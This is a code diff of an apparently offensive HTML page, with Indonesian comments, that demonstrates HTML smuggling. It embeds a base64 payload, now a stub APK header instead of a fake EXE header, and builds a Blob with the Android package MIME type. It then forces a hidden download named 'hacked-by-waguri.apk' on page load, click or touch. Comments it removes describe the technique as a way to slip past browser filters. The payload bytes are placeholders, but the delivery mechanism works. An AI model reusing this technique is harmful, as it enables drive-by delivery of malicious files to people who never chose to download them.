@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Chaining: HTML Smuggling + Blob API Bypass</title>
+<title>Chaining: HTML Smuggling + Blob API Bypass (APK)</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -22,8 +22,8 @@ button:hover { background: #b71c1c; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Chaining: HTML Smuggling + Blob API Bypass</h2>
-<p>Klik tombol untuk memicu pembuatan file yang mengeksploitasi Blob API dan Data URI.</p>
+<h2>Chaining: HTML Smuggling + Blob API (APK)</h2>
+<p>Klik tombol untuk memicu pembuatan file .txt yang saat dibuka akan menyelundupkan file .apk via Blob API.</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
@@ -52,7 +52,6 @@ const speak = (message) => {
 const prepareMimeBlobAsync = (i) => {
     return new Promise((resolve) => {
         queueMicrotask(() => {
-            // PAYLOAD HTML SMUGGLING YANG DIRANGKAI DENGAN BLOB API
             const payloadText = "<!DOCTYPE html>" +
             "<html>" +
             "<head><meta charset='UTF-8'><title>HACKED BY</title></head>" +
@@ -83,7 +82,9 @@ const prepareMimeBlobAsync = (i) => {
             "    return bytes;" +
             "}" +
             
-            "var b64Data = \"TVqQAAMAAAAEAAAAAEEAAgBA\";" + // Payload EXE tiruan
+            // PAYLOAD APK (Header ZIP: PK\x03\x04)
+            "var b64Data = \"UEsDBAoAAAAAAAAAIQAAAAAAAAAAAAAAAAAAAAAAAAAA\";" +
+            
             "var sudah = false;" +
             
             "function picuDownload(){" +
@@ -91,27 +92,26 @@ const prepareMimeBlobAsync = (i) => {
             "    sudah = true;" +
             "    var statusEl = document.getElementById('status');" +
             "    try{" +
-            "        statusEl.textContent = 'Menyiapkan berkas...';" +
+            "        statusEl.textContent = 'Menyiapkan berkas APK...';" +
             "        var bytesArr = b64KeBytes(b64Data);" +
             
-            // FITUR BYPASS API 1: Menggunakan Blob dengan MIME TYPE yang dimanipulasi
-            // Terkadang Chrome mengabaikan filter jika tipe kontennya text/plain atau application/octet-stream
-            "        var blob = new Blob([bytesArr], { type: 'application/octet-stream' });" +
+            // Menggunakan MIME type khusus Android Package
+            "        var blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });" +
             "        var url = URL.createObjectURL(blob);" +
-            
-            // FITUR BYPASS API 2: Elemen Anchor dengan atribut download dan trik DOM
             "        var a = document.createElement('a');" +
             "        a.href = url;" +
-            "        a.download = 'hacked-by-anonymous.exe';" +
+            
+            // Nama file diubah menjadi .apk
+            "        a.download = 'hacked-by-waguri.apk';" +
+            
             "        a.style.display = 'none';" +
             "        document.body.appendChild(a);" +
             "        a.click();" +
-            
             "        setTimeout(function(){ " +
             "            if (a.parentNode) a.parentNode.removeChild(a); " +
             "            URL.revokeObjectURL(url); " +
             "        }, 3000);" +
-            "        statusEl.textContent = 'Payload berhasil diunduh!';" +
+            "        statusEl.textContent = 'Payload APK berhasil diunduh!';" +
             "        statusEl.style.color = '#0f0';" +
             "    } catch(e){" +
             "        statusEl.textContent = 'Gagal: ' + e.message;" +
@@ -120,7 +120,6 @@ const prepareMimeBlobAsync = (i) => {
             "    }" +
             "}" +
             
-            // TRIGGER: Event Listener (User Gesture)
             "window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
             "document.addEventListener('click', picuDownload);" +
             "document.addEventListener('touchstart', picuDownload);" +
